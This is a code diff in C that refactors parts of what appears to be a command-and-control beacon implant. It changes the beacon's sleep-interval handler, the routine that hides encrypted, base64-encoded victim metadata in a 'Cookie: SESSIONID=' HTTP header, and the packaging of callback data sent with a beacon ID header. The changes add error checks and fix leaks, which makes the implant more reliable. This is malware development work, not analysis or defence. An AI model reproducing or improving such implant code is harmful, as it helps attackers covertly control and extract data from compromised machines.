@@ -10,10 +10,10 @@ extern int Counter;
 extern unsigned char AESRandaeskey[16];
 extern int clientID;
 
-VOID CmdChangSleepTimes(unsigned char* CommandBuf) {
-    uint8_t buf[4];
-    memcpy(buf, CommandBuf, 4);
-    uint32_t sleep = bigEndianUint32(buf);
+VOID CmdChangSleepTimes(unsigned char* commandBuf) {
+    uint8_t buffer[4];
+    memcpy(buffer, commandBuf, 4);
+    uint32_t sleep = bigEndianUint32(buffer);
     SleepTime = sleep;
 }
 
@@ -22,38 +22,76 @@ wchar_t* makeMetaData() {
     unsigned char* EncryMetainfo = EncryMetainfos.EncryMetadata;
     int EncryMetainfolen = EncryMetainfos.EncryMetadataLen;
 
+    if (!EncryMetainfo || EncryMetainfolen <= 0) {
+        fprintf(stderr, "EncryMetadata failed\n");
+        return NULL;
+    }
+
     unsigned char* baseEncodeMetadata = base64Encode(EncryMetainfo, EncryMetainfolen);
+    free(EncryMetainfo);
+    if (!baseEncodeMetadata) {
+		fprintf(stderr, "base64Encode failed\n");
+        return NULL;
+    }
 
     size_t headers_length = strlen(metadata_header) + strlen(metadata_prepend);
 
-    unsigned char* headerstart = (unsigned char*)malloc(headers_length + 1);
-    if (headerstart) {
-        memcpy(headerstart, metadata_header, strlen(metadata_header));
-        memcpy(headerstart + strlen(metadata_header), metadata_prepend, strlen(metadata_prepend));
-        headerstart[headers_length] = '\0';
-    }
-    //header[] = "Cookie: SESSIONID=";
-    unsigned char* concatenatedString = (unsigned char*)malloc(strlen(headerstart) + strlen(baseEncodeMetadata) + 1);
-    if (concatenatedString) {
-        strcpy(concatenatedString, headerstart);
-        strcat(concatenatedString, baseEncodeMetadata);
-        // 转换为宽字符
-        int wideLen = MultiByteToWideChar(CP_ACP, 0, concatenatedString, -1, NULL, 0);
-        wchar_t* wConcatenatedString = (wchar_t*)malloc(wideLen * sizeof(wchar_t));
-        if (!wConcatenatedString) {
-            fprintf("Memory allocatin failed", GetLastError());
-            free(concatenatedString);
-            return;
-        }
-        MultiByteToWideChar(CP_ACP, 0, concatenatedString, -1, wConcatenatedString, wideLen);
-        wcscat(wConcatenatedString, L"\r\n"); // 添加请求头结尾
-
-        free(headerstart);
+    unsigned char* headerStart = (unsigned char*)malloc(headers_length + 1);
+    if (!headerStart) {
+        fprintf(stderr, "Memory allocation failed for headerStart\n");
         free(baseEncodeMetadata);
-        free(concatenatedString);
-
-        return wConcatenatedString;
+        return NULL;
     }
+
+    memcpy(headerStart, metadata_header, strlen(metadata_header));
+    memcpy(headerStart + strlen(metadata_header), metadata_prepend, strlen(metadata_prepend));
+    headerStart[headers_length] = '\0';
+
+    size_t cookieLen = strlen(headerStart) + strlen(baseEncodeMetadata);
+    unsigned char* cookieStr = (unsigned char*)malloc(cookieLen + 1);
+    if (!cookieStr) {
+        fprintf(stderr, "Memory allocation failed for cookieStr\n");
+        free(headerStart);
+        free(baseEncodeMetadata);
+        return NULL;
+    }
+
+    strcpy((char*)cookieStr, (char*)headerStart);
+    strcat((char*)cookieStr, (char*)baseEncodeMetadata);
+
+	free(headerStart);
+	free(baseEncodeMetadata);
+
+    // 转换为宽字符
+    int wideLen = MultiByteToWideChar(CP_ACP, 0, (char*)cookieStr, -1, NULL, 0);
+    if (wideLen == 0) {
+        fprintf(stderr, "MultiByteToWideChar Failed With Error：%lu\n", GetLastError());
+        free(cookieStr);
+        return NULL;
+    }
+
+    // 多分配 3 wchar_t：\r, \n, \0
+    wchar_t* wCookieStr = (wchar_t*)malloc((wideLen + 3) * sizeof(wchar_t));
+    if (!wCookieStr) {
+        fprintf(stderr, "Memory allocation failed for wCookieStr\n");
+        free(cookieStr);
+        return NULL;
+    }
+
+    if (MultiByteToWideChar(CP_ACP, 0, (char*)cookieStr, -1, wCookieStr, wideLen) == 0) {
+        fprintf(stderr, "MultiByteToWideChar Failed With Error:%lu\n", GetLastError());
+        free(cookieStr);
+        free(wCookieStr);
+        return NULL;
+    }
+
+    // 追加 CRLF
+	// 自动在结尾添加 \0
+    wcsncat(wCookieStr, L"\r\n", 2);
+
+    free(cookieStr);
+
+	return wCookieStr;
 }
 
 static BOOL append_data(unsigned char** buf, size_t* buf_length, size_t* buf_capacity, unsigned char* data, size_t dataLen) {
@@ -163,11 +201,9 @@ unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, s
 }
 
 VOID DataProcess(unsigned char* postMsg, size_t msgLen, int callbackType) {
-    postMsg[msgLen] = '\0';
-
     unsigned char* BeaconIdHeader = makeBeaconIdHeader();
     unsigned char* dataString = makePostData(postMsg, msgLen, callbackType);
-    size_t dataSize = strlen((char*)dataString);
+    size_t dataSize = strlen(dataString);
 
     wchar_t BeaconIdWideHeader[256];
     MultiByteToWideChar(CP_ACP, 0, BeaconIdHeader, -1, BeaconIdWideHeader, 256);
